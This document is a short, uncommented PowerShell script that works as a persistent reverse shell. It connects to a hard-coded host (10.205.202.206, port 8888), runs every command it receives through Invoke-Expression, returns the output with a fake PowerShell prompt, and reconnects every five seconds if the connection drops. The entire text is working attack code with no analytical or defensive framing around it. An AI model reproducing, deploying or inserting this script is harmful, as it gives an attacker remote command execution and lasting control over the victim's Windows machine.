$h='10.205.202.206'
$p=8888

while($true){
    try{
        $a=New-Object Net.Sockets.TCPClient($h,$p)
        $s=$a.GetStream()
        $b=New-Object Byte[] 65535
        $e=New-Object Text.ASCIIEncoding
        
        while(($i=$s.Read($b,0,$b.Length)) -ne 0){
            $d=$e.GetString($b,0,$i).Trim()
            if (![string]::IsNullOrWhiteSpace($d)) {
                try{
                    $r=(Invoke-Expression $d 2>&1 | Out-String)
                }catch{
                    $r=$_.Exception.Message
                }
                $r2=$r+"`nPS "+(pwd).Path+"> "
                $sb=$e.GetBytes($r2)
                $s.Write($sb,0,$sb.Length)
                $s.Flush()
            }
        }
        $a.Close()
    }catch{
        Start-Sleep -Seconds 5
    }
}